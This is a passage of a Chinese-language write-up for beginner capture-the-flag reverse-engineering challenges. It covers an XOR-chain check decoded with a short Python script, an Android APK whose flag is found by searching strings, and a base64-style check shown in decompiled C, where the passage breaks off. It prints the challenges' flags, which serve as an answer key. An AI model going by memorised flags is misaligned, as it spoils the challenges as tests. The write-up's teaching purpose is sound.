<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">unsigned</span> <span class="token keyword">char</span> aFKWOXZUPFVMDGH<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token number">102</span><span class="token punctuation">,</span>  <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span>  <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span>  <span class="token number">38</span><span class="token punctuation">,</span>  <span class="token number">79</span><span class="token punctuation">,</span>  <span class="token number">46</span><span class="token punctuation">,</span>  <span class="token number">64</span><span class="token punctuation">,</span>  <span class="token number">17</span><span class="token punctuation">,</span> </pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token number">120</span><span class="token punctuation">,</span>  <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">90</span><span class="token punctuation">,</span>  <span class="token number">59</span><span class="token punctuation">,</span>  <span class="token number">85</span><span class="token punctuation">,</span>  <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span>  <span class="token number">25</span><span class="token punctuation">,</span>  <span class="token number">70</span><span class="token punctuation">,</span>  <span class="token number">31</span><span class="token punctuation">,</span> </pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token number">118</span><span class="token punctuation">,</span>  <span class="token number">34</span><span class="token punctuation">,</span>  <span class="token number">77</span><span class="token punctuation">,</span>  <span class="token number">35</span><span class="token punctuation">,</span>  <span class="token number">68</span><span class="token punctuation">,</span>  <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span>   <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span>  <span class="token number">15</span><span class="token punctuation">,</span> </pre></td></tr><tr><td data-num="6"></td><td><pre>   <span class="token number">71</span><span class="token punctuation">,</span>  <span class="token number">50</span><span class="token punctuation">,</span>  <span class="token number">79</span><span class="token punctuation">,</span>   <span class="token number">0</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>设这个数组是 global 数组</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>global<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token number">102</span><span class="token punctuation">,</span>  <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span>  <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span>  <span class="token number">38</span><span class="token punctuation">,</span>  <span class="token number">79</span><span class="token punctuation">,</span>  <span class="token number">46</span><span class="token punctuation">,</span>  <span class="token number">64</span><span class="token punctuation">,</span>  <span class="token number">17</span><span class="token punctuation">,</span> </pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token number">120</span><span class="token punctuation">,</span>  <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">90</span><span class="token punctuation">,</span>  <span class="token number">59</span><span class="token punctuation">,</span>  <span class="token number">85</span><span class="token punctuation">,</span>  <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span>  <span class="token number">25</span><span class="token punctuation">,</span>  <span class="token number">70</span><span class="token punctuation">,</span>  <span class="token number">31</span><span class="token punctuation">,</span> </pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token number">118</span><span class="token punctuation">,</span>  <span class="token number">34</span><span class="token punctuation">,</span>  <span class="token number">77</span><span class="token punctuation">,</span>  <span class="token number">35</span><span class="token punctuation">,</span>  <span class="token number">68</span><span class="token punctuation">,</span>  <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span>   <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span>  <span class="token number">15</span><span class="token punctuation">,</span> </pre></td></tr><tr><td data-num="6"></td><td><pre>   <span class="token number">71</span><span class="token punctuation">,</span>  <span class="token number">50</span><span class="token punctuation">,</span>  <span class="token number">79</span><span class="token punctuation">,</span>   <span class="token number">0</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>我们已知： <code>0^0=0 0^1=1</code>  则对于任意 x 有 <code>0^x=x</code></p>
<p>还已知 若  <code>a^b=c</code>  则  <code>b=a^c=a^(a^b)=(a^a)^b=0^b=b</code></p>
<p>按题目中的运算规则：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>global<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v6<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> v6<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>global<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v6<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> global<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v6<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> v6<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> v6<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="3"></td><td><pre>则</pre></td></tr><tr><td data-num="4"></td><td><pre>v6<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> global<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> global<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v6<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> v6<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> v6<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v6<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="5"></td><td><pre>v6<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> global<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span>global<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v6<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> global<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> global<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span>v6<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> </pre></td></tr><tr><td data-num="6"></td><td><pre>…………</pre></td></tr><tr><td data-num="7"></td><td><pre>v6<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> global<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> global<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v6<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> global<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> global<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v6<span class="token punctuation">[</span>i<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="8"></td><td><pre>即 v6<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> global<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> global<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr></table></figure><p>就是将我们的 flag xor 后和这个 gloabl 字符串比较，相等就正确了，</p>
<p>而我们知道两次 xor 等于没有 xor，也就是说进行两次 xor 即可还原（￣︶￣）↗</p>
<p>脚本如下：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>s<span class="token operator">=</span><span class="token string">""</span></pre></td></tr><tr><td data-num="2"></td><td><pre>a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">79</span> <span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    s<span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>a<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span></pre></td></tr></table></figure><p>执行脚本即可得到 flag</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322204437195.png" alt="image-20220322204437195" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>flag<span class="token punctuation">&#123;</span>QianQiuWanDai_YiTongJiangHu<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="helloword"><a class="anchor" href="#helloword">#</a> helloword</h2>
<p>有难的题目，也就有简单的题目，就像程序员一辈子编写的第一个程序，极有可能是 helloword，它很普通，但是也很让人怀念。你猜这题 flag 在哪里？让我们怀念第一次编写的 easy 程序吧！ 注意：得到的 flag 请包上 flag {} 提交</p>
<p>附件下载，一看后缀名 <code>.apk</code>  好吧是安卓逆向，这也是我遇到的第一个安卓逆向的题，熟悉的一梭子下来，发现 <code>ida</code>  能打开但是并不会解析什么，而 <code>ollydbg</code>  直接就打不开了，万般无奈，不懂就问百度，于是去百度了解了一波，发现一个用来解析安卓逆向的软件 <code>ApkIDE</code> ，屁颠屁颠的在网上找资源下载 ψ(｀∇´)ψ</p>
<p><code>ApkIDE</code>  打开查找即可得到 flag</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220323164437436.png" alt="image-20220323164437436" /></p>
<p>双击进入可查看详情</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322215214146.png" alt="image-20220322215214146" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>flag<span class="token punctuation">&#123;</span><span class="token number">7631</span>a988259a00816deda84afb29430a<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="reverse3"><a class="anchor" href="#reverse3">#</a> reverse3</h2>
<p>reverse3 注意：得到的 flag 请包上 flag {} 提交</p>
<p>附件打开进入主函数后，根据主函数执行结构可以发现一串字符串</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>e3nifIH9b_C@n@dH</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220323170106661.png" alt="image-20220323170106661" /></p>
<p>f5 反编译得到结果如下</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> __cdecl <span class="token function">main_0</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token class-name">size_t</span> v3<span class="token punctuation">;</span> <span class="token comment">// eax</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// eax</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token class-name">size_t</span> v5<span class="token punctuation">;</span> <span class="token comment">// eax</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">char</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-188h]</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword">char</span> v8<span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-188h]</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token keyword">signed</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [esp+DCh] [ebp-ACh]</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+E8h] [ebp-A0h]</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token keyword">signed</span> <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// [esp+E8h] [ebp-A0h]</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token keyword">char</span> Destination<span class="token punctuation">[</span><span class="token number">108</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+F4h] [ebp-94h] BYREF</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token keyword">char</span> Str<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+160h] [ebp-28h] BYREF</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token keyword">char</span> v14<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+17Ch] [ebp-Ch] BYREF</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">>=</span> <span class="token number">0x64</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>      <span class="token function">j____report_rangecheckfailure</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    Destination<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>  <span class="token function">sub_41132F</span><span class="token punctuation">(</span><span class="token string">"please enter the flag:"</span><span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>  <span class="token function">sub_411375</span><span class="token punctuation">(</span><span class="token string">"%20s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>Str<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>  v3 <span class="token operator">=</span> <span class="token function">j_strlen</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>  v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">sub_4110BE</span><span class="token punctuation">(</span>Str<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v14<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>  <span class="token function">strncpy</span><span class="token punctuation">(</span>Destination<span class="token punctuation">,</span> v4<span class="token punctuation">,</span> <span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>  v11 <span class="token operator">=</span> <span class="token function">j_strlen</span><span class="token punctuation">(</span>Destination<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> v11<span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    Destination<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+=</span> j<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>  v5 <span class="token operator">=</span> <span class="token function">j_strlen</span><span class="token punctuation">(</span>Destination<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>Destination<span class="token punctuation">,</span> Str2<span class="token punctuation">,</span> v5<span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token function">sub_41132F</span><span class="token punctuation">(</span><span class="token string">"rigth flag!\n"</span><span class="token punctuation">,</span> v8<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>  <span class="token keyword">else</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token function">sub_41132F</span><span class="token punctuation">(</span><span class="token string">"wrong flag!\n"</span><span class="token punctuation">,</span> v8<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220323170143151.png" alt="image-20220323170143151" /></p>
<p>可以看到程序是从如下部分开始执行</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">>=</span> <span class="token number">0x64</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>      <span class="token function">j____report_rangecheckfailure</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    Destination<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token function">sub_41132F</span><span class="token punctuation">(</span><span class="token string">"please enter the flag:"</span><span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token function">sub_411375</span><span class="token punctuation">(</span><span class="token string">"%20s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>Str<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  v3 <span class="token operator">=</span> <span class="token function">j_strlen</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">sub_4110BE</span><span class="token punctuation">(</span>Str<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v14<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token function">strncpy</span><span class="token punctuation">(</span>Destination<span class="token punctuation">,</span> v4<span class="token punctuation">,</span> <span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  v11 <span class="token operator">=</span> <span class="token function">j_strlen</span><span class="token punctuation">(</span>Destination<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> v11<span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    Destination<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+=</span> j<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  v5 <span class="token operator">=</span> <span class="token function">j_strlen</span><span class="token punctuation">(</span>Destination<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>Destination<span class="token punctuation">,</span> Str2<span class="token punctuation">,</span> v5<span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token function">sub_41132F</span><span class="token punctuation">(</span><span class="token string">"rigth flag!\n"</span><span class="token punctuation">,</span> v8<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>  <span class="token keyword">else</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">sub_41132F</span><span class="token punctuation">(</span><span class="token string">"wrong flag!\n"</span><span class="token punctuation">,</span> v8<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>输入的字符串经过 <code>sub_4110BE函数</code> 进行加密，然后再通过一个 for 循环进行变换，然后与 str 进行比较<br />
直接查看 Str2 的字符串：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220323170700391.png" alt="image-20220323170700391" /></p>
<p>也就是我们之前看到的那串字符串。</p>
<p>接下来我们跟进加密函数 <code>sub_4110BE</code>  得到如下：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220323170942563.png" alt="image-20220323170942563" /></p>
<p>继续根据 <code>sub_411AB0</code>  函数，得到如下：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">void</span> <span class="token operator">*</span>__cdecl <span class="token function">sub_411AB0</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>a3<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [esp+D4h] [ebp-38h]</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [esp+D4h] [ebp-38h]</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [esp+D4h] [ebp-38h]</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+D4h] [ebp-38h]</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+E0h] [ebp-2Ch]</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [esp+ECh] [ebp-20h]</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [esp+ECh] [ebp-20h]</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// [esp+ECh] [ebp-20h]</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token keyword">void</span> <span class="token operator">*</span>v12<span class="token punctuation">;</span> <span class="token comment">// [esp+F8h] [ebp-14h]</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token keyword">char</span> <span class="token operator">*</span>v13<span class="token punctuation">;</span> <span class="token comment">// [esp+104h] [ebp-8h]</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a1 <span class="token operator">||</span> <span class="token operator">!</span>a2 <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  v9 <span class="token operator">=</span> a2 <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">3</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token operator">++</span>v9<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>  v10 <span class="token operator">=</span> <span class="token number">4</span> <span class="token operator">*</span> v9<span class="token punctuation">;</span></pre></td></tr><tr><td 